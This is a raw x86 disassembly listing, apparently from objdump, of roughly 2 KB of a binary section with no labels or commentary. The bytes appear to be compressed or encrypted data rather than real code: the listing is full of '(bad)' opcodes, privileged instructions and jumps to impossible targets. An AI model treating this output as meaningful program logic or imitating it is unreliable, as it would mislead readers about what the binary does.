  41563b:	enter  0xcdb0,0x66
  41563f:	and    ecx,DWORD PTR [ebp-0xe]
  415642:	shr    ebp,cl
  415644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415645:	inc    esi
  415646:	push   esi
  415647:	arpl   ax,ax
  415649:	adc    al,BYTE PTR [edx+0x14]
  41564c:	jnp    0x4155fb
  41564e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41564f:	jno    0x4156d0
  415651:	test   eax,0xe13569fc
  415656:	out    0x76,al
  415658:	jp     0x41563e
  41565a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41565b:	xchg   esp,ebp
  41565d:	add    ch,BYTE PTR [edi+0x3d]
  415660:	lods   al,BYTE PTR ds:[esi]
  415661:	and    eax,DWORD PTR [esi-0x65c12505]
  415667:	xlat   BYTE PTR ds:[ebx]
  415668:	pop    ebx
  415669:	leave  
  41566a:	jecxz  0x415633
  41566c:	stos   BYTE PTR es:[edi],al
  41566d:	jno    0x415690
  41566f:	mov    ebp,0xf44cee64
  415674:	push   0xfc21b24
  415679:	pop    es
  41567a:	adc    al,0x21
  41567c:	or     BYTE PTR [edx],al
  41567e:	xlat   BYTE PTR ds:[ebx]
  41567f:	sti    
  415680:	(bad)  
  415681:	pop    ebp
  415682:	mov    dl,0x69
  415684:	loopne 0x41560d
  415686:	jmp    0x415610
  415688:	pop    ecx
  415689:	add    bh,bl
  41568b:	sub    al,0x6e
  41568d:	jge    0x415612
  41568f:	fwait
  415690:	dec    ebx
  415691:	jg     0x41565c
  415693:	pop    ebx
  415694:	mov    es,ebp
  415696:	inc    esp
  415697:	aad    0x13
  415699:	rcr    DWORD PTR [edx-0xd1f76de],1
  41569f:	jo     0x415685
  4156a1:	ins    BYTE PTR es:[edi],dx
  4156a2:	test   DWORD PTR [edx-0x62],ecx
  4156a5:	mov    ebp,0x6286ca23
  4156aa:	call   0x204:0xefc2715
  4156b1:	out    dx,al
  4156b2:	pop    eax
  4156b3:	push   ds
  4156b4:	pop    esi
  4156b5:	jmp    0x4156c2
  4156b7:	inc    esi
  4156b8:	mov    edx,0x7687866e
  4156bd:	imul   esi,DWORD PTR ds:0x5026ac17,0xffffffe1
  4156c4:	mov    es,WORD PTR [ecx+0x4ba74558]
  4156ca:	push   es
  4156cb:	adc    eax,0xffffffdb
  4156ce:	and    DWORD PTR [edx],0x28673d4
  4156d4:	idiv   BYTE PTR [edx-0x48]
  4156d7:	in     eax,0x94
  4156d9:	or     al,BYTE PTR [esp+edx*8+0x3a]
  4156dd:	cmc    
  4156de:	pop    edx
  4156df:	pop    ebx
  4156e0:	aad    0xfc
  4156e2:	ret    0xce68
  4156e5:	cli    
  4156e6:	xchg   esi,eax
  4156e7:	add    DWORD PTR [ecx-0x77],ebp
  4156ea:	pop    ss
  4156eb:	sub    esi,DWORD PTR [ebp-0x42]
  4156ee:	imul   BYTE PTR [edi+0x50]
  4156f1:	or     ch,BYTE PTR [esi+0x229fd4e]
  4156f7:	je     0x41574b
  4156f9:	mov    esi,0xc1d76c1f
  4156fe:	and    al,0xb4
  415700:	fxch   st(4)
  415702:	inc    edi
  415703:	stos   DWORD PTR es:[edi],eax
  415704:	inc    eax
  415705:	inc    edi
  415706:	les    ebx,FWORD PTR [ecx-0x7]
  415709:	sbb    eax,DWORD PTR [edi]
  41570b:	mov    al,bl
  41570d:	xor    eax,DWORD PTR [ecx+0x108d9b1b]
  415713:	(bad)  
  415714:	(bad)  
  415715:	cmp    ebx,edx
  415717:	dec    edi
  415718:	int    0xd7
  41571a:	sub    DWORD PTR [edi+ecx*1+0xf4e7a87],ebx
  415721:	ins    BYTE PTR es:[edi],dx
  415722:	(bad)  
  415723:	scas   eax,DWORD PTR es:[edi]
  415724:	dec    edi
  415725:	xchg   edi,eax
  415726:	iret   
  415727:	int    0xb2
  415729:	in     eax,dx
  41572a:	mov    ebp,0xd9dfaf38
  41572f:	popa   
  415730:	or     DWORD PTR [eax],ebp
  415732:	hlt    
  415733:	ret    
  415734:	rcl    DWORD PTR [ebx-0x6b7cc94],0x99
  41573b:	retf   0x32e3
  41573e:	and    bl,BYTE PTR ds:0xe70ed43d
  415744:	pusha  
  415745:	mov    bl,BYTE PTR [edi-0x7ddbe9d4]
  41574b:	and    ah,BYTE PTR [bx+di-0x6b6]
  415750:	dec    esi
  415751:	pop    edi
  415752:	ss aam 0x25
  415755:	pusha  
  415756:	add    eax,DWORD PTR [edx-0x247b242c]
  41575c:	nop
  41575d:	fwait
  41575e:	mov    edx,0x342ca85d
  415763:	and    DWORD PTR [ebx+0x6ec3600a],eax
  415769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41576a:	ror    DWORD PTR ds:0x3b05cbb,0xdf
  415771:	adc    BYTE PTR [edx+0x1a39ec68],0xaf
  415778:	xchg   edi,eax
  415779:	fisttp WORD PTR [ecx-0x2126d2bc]
  41577f:	cmp    DWORD PTR [eax-0x8],ebx
  415782:	adc    ah,BYTE PTR [edx+0x512f4791]
  415788:	fdiv   DWORD PTR [esi-0x54ca971c]
  41578e:	jmp    0x4157ed
  415790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415791:	push   ebp
  415792:	mov    ah,0x4e
  415794:	push   ss
  415795:	jmp    0x8d357111
  41579a:	dec    esp
  41579b:	ret    0x576a
  41579e:	cmp    al,0xb4
  4157a0:	dec    ecx
  4157a1:	loopne 0x41572d
  4157a3:	mov    eax,0xf888e261
  4157a8:	fstp   DWORD PTR [ebp+ebx*1+0x6469763f]
  4157af:	mov    esi,DWORD PTR [edi+0x64]
  4157b2:	push   eax
  4157b3:	mov    DWORD PTR [edx+0x3b82859f],ecx
  4157b9:	cmc    
  4157ba:	test   DWORD PTR [esi],esi
  4157bc:	mov    ebp,0xe657f2f0
  4157c1:	mov    ss,esi
  4157c3:	push   ss
  4157c4:	sar    DWORD PTR [eax],cl
  4157c6:	mov    BYTE PTR [ecx-0x77],ah
  4157c9:	fwait
  4157ca:	push   esp
  4157cb:	xor    al,BYTE PTR [edi+0x35]
  4157ce:	pop    ecx
  4157cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157d0:	mov    ds:0xc99ab9e7,al
  4157d5:	out    dx,eax
  4157d6:	mov    ecx,DWORD PTR cs:[esi]
  4157d9:	daa    
  4157da:	lods   al,BYTE PTR ds:[esi]
  4157db:	js     0x4157ad
  4157dd:	add    eax,0xcefbe068
  4157e2:	xchg   ebx,eax
  4157e3:	adc    eax,0xdb87f308
  4157e8:	pop    esp
  4157e9:	js     0x4157f0
  4157eb:	add    DWORD PTR [ebx-0x43d57d0],eax
  4157f1:	jae    0x415851
  4157f3:	sbb    al,0x9
  4157f5:	test   al,0x14
  4157f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157f8:	mov    edi,DWORD PTR [ebx+0x76773c20]
  4157fe:	xchg   ecx,eax
  4157ff:	jae    0x4157e2
  415801:	bound  eax,QWORD PTR [edi-0x4a54fb0]
  415807:	mov    eax,ds:0x7bbc398c
  41580c:	xchg   esp,eax
  41580d:	mov    eax,0x5bc9a31
  415812:	loopne 0x415800
  415814:	(bad)  
  415815:	cmp    BYTE PTR [ebx],ah
  415817:	push   ss
  415818:	(bad)  
  415819:	rcl    BYTE PTR [ecx-0x46],1
  41581c:	xchg   ebx,eax
  41581d:	sbb    ecx,DWORD PTR [eax-0x3f]
  415820:	mov    esi,0x46406e4b
  415825:	outs   dx,BYTE PTR ds:[esi]
  415826:	push   esp
  415827:	leave  
  415828:	mov    edx,0xaa22d5b4
  41582d:	ss xchg esi,eax
  41582f:	aas    
  415830:	lahf   
  415831:	mov    ds:0x234b852a,eax
  415836:	xor    BYTE PTR [ecx-0x2ea8b4fe],0x4a
  41583d:	sub    eax,0x983a76b8
  415842:	jp     0x415805
  415844:	shl    DWORD PTR [edi],cl
  415846:	or     BYTE PTR [ecx],al
  415848:	int3   
  415849:	jle    0x415831
  41584b:	sub    al,0xf8
  41584d:	loopne 0x415820
  41584f:	in     al,dx
  415850:	ja     0x41584f
  415852:	and    edi,DWORD PTR [ebp-0x700f1a76]
  415858:	or     DWORD PTR [esi-0x70],eax
  41585b:	push   0x67
  41585d:	pop    ds
  41585e:	imul   edx,DWORD PTR [edx-0x60f25b6b],0x66
  415865:	adc    ebp,DWORD PTR [ebp-0x477c5c29]
  41586b:	cli    
  41586c:	xor    BYTE PTR [esi],ah
  41586e:	xor    BYTE PTR [esi-0x659079e6],cl
  415874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415875:	cs enter 0x830c,0x2d
  41587a:	jmp    0x2e97:0xbf468172
  415881:	loope  0x4158cb
  415883:	(bad)  
  415884:	out    0x5a,eax
  415886:	inc    esi
  415887:	pusha  
  415888:	loope  0x4158d1
  41588a:	xchg   DWORD PTR es:[ebx+0x3d766433],esp
  415891:	aad    0x81
  415893:	mov    al,0x2e
  415895:	cmp    DWORD PTR [ebx],esp
  415897:	(bad)  
  415899:	popa   
  41589a:	pop    ds
  41589b:	lock mov ch,0x58
  41589e:	ja     0x4158b9
  4158a0:	loop   0x415889
  4158a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158a3:	ja     0x4158c4
  4158a5:	inc    edx
  4158a6:	and    BYTE PTR [ebx-0x1b],cl
  4158a9:	push   ss
  4158aa:	ins    DWORD PTR es:[edi],dx
  4158ab:	jp     0x415914
  4158ad:	(bad)  
  4158ae:	fisttp DWORD PTR [ebp-0x38771d43]
  4158b4:	pop    ds
  4158b5:	inc    edx
  4158b6:	adc    al,BYTE PTR [esi]
  4158b8:	mov    eax,DWORD PTR es:[esi]
  4158bb:	aaa    
  4158bc:	repnz sahf 
  4158be:	cmp    DWORD PTR [ebx-0x44],ebx
  4158c1:	mov    esi,0xd5446805
  4158c6:	push   0xe5c31cb
  4158cb:	mov    eax,ds:0xa0b3e4bb
  4158d0:	jb     0x4158d3
  4158d2:	push   cs
  4158d3:	repnz in al,dx
  4158d5:	xchg   ecx,eax
  4158d6:	mov    ebp,0xc4bb4728
  4158db:	ins    BYTE PTR es:[edi],dx
  4158dc:	mov    dl,0x10
  4158de:	sub    ah,ch
  4158e0:	mov    eax,0x965c6c79
  4158e5:	xchg   edx,eax
  4158e6:	repnz bound eax,QWORD PTR [eax-0x472c55c7]
  4158ed:	add    BYTE PTR [ecx+0x140dd10d],ch
  4158f3:	leave  
  4158f4:	clc    
  4158f5:	add    eax,0x80e17da7
  4158fa:	aas    
  4158fb:	retf   
  4158fc:	pop    ebp
  4158fd:	call   0xbaf7:0x1acdddea
  415904:	sahf   
  415905:	jno    0x415971
  415907:	(bad)  
  415909:	mov    edi,0xa542102f
  41590e:	push   cs
  41590f:	cmp    bl,dh
  415911:	jmp    0x415894
  415913:	jmp    0xb2b33341
  415918:	dec    esi
  415919:	jmp    0x4158b3
  41591b:	pop    ebx
  41591c:	cmp    al,0x9c
  41591e:	xchg   edx,eax
  41591f:	xor    eax,0x455d9fc9
  415924:	into   
  415925:	mov    bh,0x6a
  415927:	mov    eax,ds:0x1ae5cf11
  41592c:	or     edi,DWORD PTR [edi+0x21]
  41592f:	inc    edx
  415930:	xor    BYTE PTR ds:0x816a96ab,dl
  415936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415937:	or     ah,al
  415939:	pushf  
  41593a:	dec    edx
  41593b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41593c:	daa    
  41593d:	inc    ebx
  41593e:	mov    ah,BYTE PTR [ebx+0x29]
  415941:	lahf   
  415942:	xor    eax,0x8d90b20b
  415947:	cmp    al,0x21
  415949:	ins    BYTE PTR es:[edi],dx
  41594a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41594b:	arpl   WORD PTR [ebx+esi*4+0x29a1db49],si
  415952:	enter  0xe2c9,0x50
  415956:	mov    cs,WORD PTR fs:[ebx+0x4101c496]
  41595d:	jl     0x41591b
  41595f:	jae    0x41591e
  415961:	push   edi
  415962:	cdq    
  415963:	inc    esp
  415964:	inc    esp
  415965:	iret   
  415966:	jg     0x4159c6
  415968:	push   0x5a
  41596a:	sbb    DWORD PTR [esi-0x35188fb8],esp
  415970:	loop   0x4159d1
  415972:	or     eax,0x405bc021
  415977:	push   edx
  415978:	push   ds
  415979:	inc    esi
  41597a:	sbb    ebp,0xa03fba44
  415980:	test   DWORD PTR [ecx-0x352b255b],esi
  415986:	test   BYTE PTR [ebx-0x26aecb30],al
  41598c:	imul   ebp,DWORD PTR [edx+0x2cbe1b6e],0xffffffb6
  415993:	ror    BYTE PTR [ebx-0x4465027c],cl
  415999:	sahf   
  41599a:	cwde   
  41599b:	test   eax,0xfca19e76
  4159a0:	xor    al,0x70
  4159a2:	pop    esp
  4159a3:	cs push ebp
  4159a5:	mov    edi,0x2ea6a121
  4159aa:	lock mov WORD PTR [ebp-0x2a],cs
  4159ae:	xor    ebx,ebp
  4159b0:	imul   esi,DWORD PTR [esi+0x7cb67b07],0x41481d60
  4159ba:	jo     0x415a30
  4159bc:	or     DWORD PTR [ecx],esi
  4159be:	pop    ecx
  4159bf:	icebp  
  4159c0:	test   eax,0xad04ea7c
  4159c5:	nop
  4159c6:	or     ebx,esp
  4159c8:	data16 jo 0x415a40
  4159cb:	adc    BYTE PTR [ebp+0x7e],bh
  4159ce:	aas    
  4159cf:	or     DWORD PTR [ecx+edi*2+0x772eff78],esp
  4159d6:	dec    BYTE PTR [edi]
  4159d8:	xchg   ebp,eax
  4159d9:	aaa    
  4159da:	sub    bh,0x55
  4159dd:	punpckhwd mm6,QWORD PTR [edx-0x57]
  4159e1:	or     eax,0xd2ab18ed
  4159e6:	jp     0x415a13
  4159e8:	dec    ebp
  4159e9:	or     BYTE PTR [ecx+0x45],ah
  4159ec:	xchg   dh,dl
  4159ee:	mov    ds:0x61d14237,al
  4159f3:	enter  0x1a3c,0x5d
  4159f7:	ret    0x5df5
  4159fa:	lods   eax,DWORD PTR ds:[esi]
  4159fb:	pop    eax
  4159fc:	adc    eax,0x4ed2a9b5
  415a01:	test   bh,cl
  415a03:	pop    esp
  415a04:	jae    0x4159e3
  415a06:	push   ecx
  415a07:	pusha  
  415a08:	xchg   edi,eax
  415a09:	sbb    ah,dl
  415a0b:	(bad)  
  415a0c:	or     eax,DWORD PTR [edi+0x32]
  415a0f:	stos   DWORD PTR es:[edi],eax
  415a10:	int3   
  415a11:	mov    ch,0x95
  415a13:	jge    0x415a22
  415a15:	(bad)
  415a18:	sbb    al,0x79
  415a1a:	pop    edx
  415a1b:	cmp    edx,DWORD PTR [esi-0x1f]
  415a1e:	mov    ebp,0xdad4e405
  415a23:	sub    eax,0xeaa75567
  415a28:	and    cl,bl
  415a2a:	(bad)  
  415a2b:	(bad)  
  415a2d:	fidivr DWORD PTR [edi+0x16af031c]
  415a33:	lods   eax,DWORD PTR ds:[esi]
  415a34:	ss xor ah,0x40
  415a38:	jne    0x4159fd
  415a3a:	xor    al,0x25
  415a3c:	lahf   
  415a3d:	test   eax,0x221de4c6
  415a42:	cmp    bl,dl
  415a44:	adc    cl,cl
  415a46:	arpl   WORD PTR [edx+0xcebb40f],ax
  415a4c:	push   ds
  415a4d:	mov    ecx,0x8ea21a70
  415a52:	sahf   
  415a53:	push   edx
  415a54:	bswap  esp
  415a56:	fisttp WORD PTR [esi+0x46]
  415a59:	xchg   edi,eax
  415a5a:	mov    esi,0xd897bc17
  415a5f:	dec    esp
  415a60:	pop    ebx
  415a61:	mov    dh,0x62
  415a63:	fdiv   DWORD PTR [eax+0x5e]
  415a66:	mov    ah,0x1e
  415a68:	aas    
  415a69:	sbb    DWORD PTR [ebx+0x5],0x29f7b741
  415a70:	or     BYTE PTR [ecx-0x43],bl
  415a73:	sub    BYTE PTR [eax+edx*2],bl
  415a76:	nop
  415a77:	cmp    al,0x30
  415a79:	mov    eax,0x3d8c1a40
  415a7e:	ror    bh,0xa4
  415a81:	jmp    0x415a7c
  415a83:	pop    ds
  415a84:	in     al,dx
  415a85:	mov    bh,0xec
  415a87:	test   al,0x46
  415a89:	mov    edi,gs
  415a8b:	(bad)  
  415a8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a8e:	sub    eax,0x53cc5bc4
  415a93:	(bad)  
  415a94:	xor    dh,BYTE PTR [ecx]
  415a96:	mov    esi,0x2dd0f48b
  415a9b:	pop    DWORD PTR [ebp-0x7c]
  415a9e:	neg    BYTE PTR [ecx-0x4c229ab9]
  415aa4:	mov    DWORD PTR [ebx-0x7c8f49a6],0x989e7163
  415aae:	add    DWORD PTR [esp+eax*8-0x3e3b4f9a],esp
  415ab5:	jle    0x415aca
  415ab7:	jbe    0x415a51
  415ab9:	cmp    al,0x71
  415abb:	jae    0x415b0c
  415abd:	mov    edx,0x64c9273d
  415ac2:	dec    ebx
  415ac3:	mov    eax,0xf234074f
  415ac8:	sub    DWORD PTR ds:0x7e087710,edx
  415ace:	inc    esi
  415acf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ad0:	stos   BYTE PTR es:[edi],al
  415ad1:	shl    DWORD PTR [esi+0x5a425383],cl
  415ad7:	sbb    al,0x8b
  415ad9:	xor    esp,ecx
  415adb:	(bad)  
  415adc:	je     0x415ae0
  415ade:	and    DWORD PTR [ecx],ebp
  415ae0:	int3   
  415ae1:	cmp    esp,eax
  415ae3:	stc    
  415ae4:	ins    BYTE PTR es:[edi],dx
  415ae5:	in     eax,0xa0
  415ae7:	sub    esp,eax
  415ae9:	and    eax,0x23ca65f9
  415aee:	mov    esi,0x9d019518
  415af3:	push   esi
  415af4:	and    al,0xd0
  415af6:	mov    ebx,0xd98366ea
  415afb:	gs in  eax,dx
  415afd:	pop    eax
  415afe:	jb     0x415a9f
  415b00:	paddq  mm0,mm1
  415b03:	mov    dh,0xc
  415b05:	or     esi,ebp
  415b07:	xlat   BYTE PTR ds:[ebx]
  415b08:	leave  
  415b09:	shl    BYTE PTR [ebp+0x542defbf],0x0
  415b10:	scas   al,BYTE PTR es:[edi]
  415b11:	push   0xffffffcc
  415b13:	dec    ebp
  415b14:	jae    0x415b28
  415b16:	cs push 0x11761e89
  415b1c:	call   0x441:0xbd1b929
  415b23:	dec    ebp
  415b24:	add    eax,0xd634892f
  415b29:	jmp    0x415b97
  415b2b:	rol    esp,cl
  415b2d:	ds jge 0x415b67
  415b30:	jae    0x415b25
  415b32:	xor    eax,edx
  415b34:	iret   
  415b35:	data16 xchg dl,al
  415b38:	ficom  DWORD PTR [ebx-0x17fbd31b]
  415b3e:	call   0xbf93dc73
  415b43:	lea    ecx,[edx+0x26]
  415b46:	sub    DWORD PTR [ebx+0x2fb67c56],esi
  415b4c:	call   0xb91890a6
  415b51:	or     al,0x4d
  415b53:	icebp  
  415b54:	mov    cl,0x28
  415b56:	mov    DWORD PTR [ebp*2+0x3ffcf4c5],edi
  415b5d:	out    dx,al
  415b5e:	aam    0x51
  415b60:	jb     0x415b46
  415b62:	outs   dx,DWORD PTR ds:[esi]
  415b63:	clc    
  415b64:	test   eax,0x6c0acfcd
  415b69:	xlat   BYTE PTR ds:[ebx]
  415b6a:	ret    
  415b6b:	adc    ebx,DWORD PTR ds:0x77c3975c
  415b71:	sub    dh,BYTE PTR [ebx-0x54]
  415b74:	add    eax,0xdf42abf5
  415b79:	xchg   esi,eax
  415b7a:	push   esi
  415b7b:	push   0x4420e9ba
  415b80:	inc    edx
  415b81:	in     al,0x3e
  415b83:	pop    es
  415b84:	inc    eax
  415b85:	push   ebx
  415b86:	mov    ah,0xad
  415b88:	addr16 mov cl,0x65
  415b8b:	cmc    
  415b8c:	inc    edx
  415b8d:	enter  0x6d92,0xd4
  415b91:	into   
  415b92:	mov    BYTE PTR [edi-0x3e6d8be7],ch
  415b98:	lahf   
  415b99:	add    BYTE PTR [ebp+0x53],dl
  415b9c:	jb     0x415be6
  415b9e:	add    DWORD PTR [edx-0x347cdd05],0x7
  415ba5:	mov    esp,0x79525738
  415baa:	pop    eax
  415bab:	bound  esi,QWORD PTR ds:0xfb8a9a51
  415bb1:	xor    al,BYTE PTR ds:0x9afecf55
  415bb7:	xor    BYTE PTR [esp+esi*1+0x2d],al
  415bbb:	cmp    DWORD PTR [edi+0x57],ecx
  415bbe:	icebp  
  415bbf:	leave  
  415bc0:	sahf   
  415bc1:	cdq    
  415bc2:	pop    esp
  415bc3:	scas   al,BYTE PTR es:[edi]
  415bc4:	push   ebx
  415bc5:	cli    
  415bc6:	inc    bp
  415bc8:	dec    esi
  415bc9:	sub    DWORD PTR [ecx+0x35a22cc5],0x8fb3f0f4
  415bd3:	in     eax,0xfe
  415bd5:	loop   0x415ba3
  415bd7:	and    bh,BYTE PTR [ebx-0x23938e89]
  415bdd:	mov    eax,ds:0x517e3db1
  415be2:	aaa    
  415be3:	iret   
  415be4:	test   eax,0x94ebc030
  415be9:	sbb    ecx,ecx
  415beb:	mov    ebx,DWORD PTR [esi]
  415bed:	push   es
  415bee:	mov    al,0x89
  415bf0:	adc    BYTE PTR ds:0x4d0256b4,0xd
  415bf7:	sub    esp,DWORD PTR [edx*8+0x1ab2f01c]
  415bfe:	dec    ecx
  415bff:	imul   ecx,DWORD PTR [edx+0x3cc4d595],0xfc12d264
  415c09:	and    DWORD PTR [esi+ebp*4-0x15],ecx
  415c0d:	(bad)  
  415c0e:	cmc    
  415c0f:	cmp    ah,BYTE PTR [eax]
  415c11:	cmp    eax,0x8b7288cf
  415c16:	xor    bl,ah
  415c18:	or     ebp,DWORD PTR [esp+edi*8-0x47]
  415c1c:	scas   eax,DWORD PTR es:[edi]
  415c1d:	cmp    eax,0x56fdfdb1
  415c22:	cmp    DWORD PTR [ebp+0x38],0xfd2cc775
  415c29:	sub    edi,esi
  415c2b:	pop    ebx
  415c2c:	push   esi
  415c2d:	jg     0x415ca4
  415c2f:	ss enter 0xe06c,0x5
  415c34:	mov    ebp,0xf2764830
  415c39:	jg     0x415c32
  415c3b:	adc    esi,DWORD PTR [ecx]
  415c3d:	jne    0x415c8c
  415c3f:	fisttp WORD PTR [ebx-0x7]
  415c42:	mov    al,0x88
  415c44:	cmp    DWORD PTR [ebx],eax
  415c46:	leave  
  415c47:	js     0x415bdb
  415c49:	retf   
  415c4a:	or     bl,bl
  415c4c:	and    eax,0xf8e50cde
  415c51:	jp     0x415cc3
  415c53:	lea    eax,[ebp-0x7b05df42]
  415c59:	xchg   DWORD PTR [ecx-0x6addb467],ecx
  415c5f:	add    ebx,DWORD PTR [ecx]
  415c61:	adc    ebp,ebp
  415c63:	push   eax
  415c64:	xor    DWORD PTR [edx],edx
  415c66:	jno    0x415cbe
  415c68:	and    eax,0xcafe4edf
  415c6d:	cmc    
  415c6e:	aas    
  415c6f:	shl    BYTE PTR [eax+0x5ea7cdf6],1
  415c75:	(bad)  
  415c76:	sbb    bh,cl
  415c78:	pop    es
  415c79:	je     0x415c26
  415c7b:	sub    eax,0x677cde43
  415c80:	int3   
  415c81:	and    esp,DWORD PTR [edi-0x68]
  415c84:	nop
  415c85:	push   eax
  415c86:	xchg   BYTE PTR [ecx],dh
  415c88:	int    0xb1
  415c8a:	test   esi,0x1774979c
  415c90:	aam    0x8b
  415c92:	mov    dl,0xf4
  415c94:	inc    edx
  415c95:	dec    ebp
  415c96:	aaa    
  415c97:	jns    0x415c93
  415c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c9a:	pop    eax
  415c9b:	add    cl,BYTE PTR [esi-0x2f14a284]
  415ca1:	dec    DWORD PTR [edx]
  415ca3:	xchg   DWORD PTR [edi],ebp
  415ca5:	shr    DWORD PTR cs:[ecx+ecx*1],cl
  415ca9:	lods   eax,DWORD PTR ds:[esi]
  415caa:	jb     0x415c54
  415cac:	or     edi,ecx
  415cae:	ins    DWORD PTR es:[edi],dx
  415caf:	mov    BYTE PTR [ecx],cl
  415cb1:	add    eax,0xa2e22fda
  415cb6:	xchg   ebp,eax
  415cb7:	aas    
  415cb8:	lods   eax,DWORD PTR ds:[esi]
  415cb9:	adc    eax,0x9b246eee
  415cbe:	xchg   ecx,eax
  415cbf:	ret    0x9da1
  415cc2:	xchg   esp,eax
  415cc3:	data16 int3 
  415cc5:	das    
  415cc6:	xchg   ecx,eax
  415cc7:	mov    ebx,0x1baef2db
  415ccc:	in     eax,dx
  415ccd:	pop    esi
  415cce:	aaa    
  415ccf:	mov    DWORD PTR [ebx-0xa829bb7],edi
  415cd5:	mov    bh,0x22
  415cd7:	test   eax,0x70f7826f
  415cdc:	mov    edi,0xc25d60ac
  415ce1:	jbe    0x415d40
  415ce3:	test   DWORD PTR [ebx-0x6c8230c5],0xf6a808aa
  415ced:	aaa    
  415cee:	stos   DWORD PTR es:[edi],eax
  415cef:	(bad)  
  415cf0:	cdq    
  415cf1:	in     eax,dx
  415cf2:	dec    ebp
  415cf3:	imul   ebx,DWORD PTR [edx+0x6b],0x17
  415cf7:	xchg   esi,eax
  415cf8:	pop    esi
  415cf9:	add    eax,0x61150a4d
  415cfe:	inc    edx
  415cff:	gs push es
  415d01:	sub    DWORD PTR [esi],esp
  415d03:	dec    DWORD PTR [edi]
  415d05:	stc    
  415d06:	sub    ecx,DWORD PTR [eax-0x2c3d215f]
  415d0c:	jmp    0x415d57
  415d0e:	fsub   DWORD PTR [esi+0x79eca319]
  415d14:	sbb    al,bl
  415d16:	mov    ss,WORD PTR [ebp-0xdbe0eda]
  415d1c:	test   ah,dl
  415d1e:	or     esp,DWORD PTR [eax]
  415d20:	mov    ecx,0xb67b3bf7
  415d25:	pop    edx
  415d26:	xlat   BYTE PTR ds:[ebx]
  415d27:	lahf   
  415d28:	sbb    al,0x5e
  415d2a:	sub    dh,bh
  415d2c:	test   BYTE PTR [ebp-0x2c],ch
  415d2f:	popf   
  415d30:	shr    BYTE PTR [edi-0x493fbdab],1
  415d36:	pop    es
  415d37:	ror    DWORD PTR [esi+edx*1],cl
  415d3a:	jmp    0xefdb7566
  415d3f:	xlat   BYTE PTR ds:[ebx]
  415d40:	xor    DWORD PTR [eax+0x2b],0xfffffff0
  415d44:	adc    al,ch
  415d46:	in     eax,0x80
  415d48:	nop
  415d49:	rol    DWORD PTR [eax-0x222f1ccf],cl
  415d4f:	sbb    bh,al
  415d51:	mov    bh,0x9a
  415d53:	jmp    0x415d04
  415d55:	mov    edx,0xa7e7d01
  415d5a:	add    BYTE PTR [edx-0x264d9d62],ch
  415d60:	adc    eax,0x1b4044c4
  415d65:	shr    DWORD PTR [ebp-0x7f],0xde
  415d69:	outs   dx,DWORD PTR ds:[esi]
  415d6a:	aas    
  415d6b:	test   eax,0x6b73e648
  415d70:	ss addr16 (bad) 
  415d73:	or     al,0x92
  415d75:	mov    al,ds:0xdcdc3fb7
  415d7a:	and    BYTE PTR [edx-0x6aa87931],0x67
  415d81:	sbb    esi,ecx
  415d83:	dec    eax
  415d84:	popf   
  415d85:	jne    0x415d5a
  415d87:	scas   al,BYTE PTR es:[edi]
  415d88:	dec    esp
  415d89:	sbb    DWORD PTR [eax+0x37a3b818],0x53d520b3
  415d93:	xor    cl,BYTE PTR [edi]
  415d95:	add    al,0xe0
  415d97:	out    0xcc,al
  415d99:	gs popa 
  415d9b:	call   0x186c1ff6
  415da0:	and    al,0x5a
  415da2:	and    DWORD PTR [ecx-0x294cf046],0xffffffaa
  415da9:	mov    cl,0x61
  415dab:	lea    ecx,[ecx-0x19]
  415dae:	outs   dx,DWORD PTR ds:[esi]
  415daf:	xor    DWORD PTR [ebp-0x7b8a716d],edx
  415db5:	and    ecx,DWORD PTR [ecx]
  415db7:	test   eax,0xc8dd57e8
  415dbc:	sub    eax,0x8404d43a
  415dc1:	aaa    
  415dc2:	xchg   bx,ax
  415dc4:	pushf  
  415dc5:	mov    bx,si
  415dc8:	sahf   
  415dc9:	call   0xcf46:0xe5c6c219
  415dd0:	and    al,0x65
  415dd2:	adc    bl,BYTE PTR [edi-0x4c3dd952]
  415dd8:	div    DWORD PTR [ebx-0x49841209]
  415dde:	xchg   esp,eax
  415ddf:	iret   
  415de0:	retf   
  415de1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415de2:	adc    bh,BYTE PTR [eax+ecx*2+0x413b5b4]
  415de9:	adc    BYTE PTR [eax+0x56841c16],dh
  415def:	and    ecx,DWORD PTR [esi-0x1ab0df5c]
  415df5:	xchg   edi,eax
  415df6:	or     ebp,DWORD PTR [ecx-0x41]
  415df9:	or     BYTE PTR [eax+0x7a],bh
  415dfc:	mov    esp,0x330a0429
  415e01:	push   ebx
  415e02:	jl     0x415e3d
  415e04:	mov    bh,0x7c
  415e06:	mov    ebx,0x20b34be5
  415e0b:	mov    al,0x86
  415e0d:	dec    ebp
  415e0e:	jbe    0x415e78
  415e10:	ret    
  415e11:	fld    DWORD PTR [eax+ebx*1+0x1d121e0]
  415e18:	mov    cl,0xc0
  415e1a:	mov    ecx,0x974e6fdf
  415e1f:	xlat   BYTE PTR ds:[ebx]
  415e20:	or     ebx,ebp
  415e22:	inc    ebx
  415e23:	jbe    0x415e92
  415e25:	mov    edx,0x3a868dde
  415e2a:	fnstenv [edi-0x76d993fc]
  415e30:	sbb    BYTE PTR [bp+si+0x2313],0x8
  415e36:	mov    dh,0x48
  415e38:	mov    ds:0x27d5a254,eax
  415e3d:	adc    DWORD PTR [edx-0x99fae1],0xbd862fe2
  415e47:	push   es
  415e48:	jmp    0xac77:0x39a569b9
  415e4f:	xchg   ebx,eax
  415e50:	into   
  415e51:	popf   
  415e52:	das    
  415e53:	mov    dl,0x3c
  415e55:	push   DWORD PTR [eax-0x39]
  415e58:	push   edi
  415e59:	les    esp,FWORD PTR [eax]
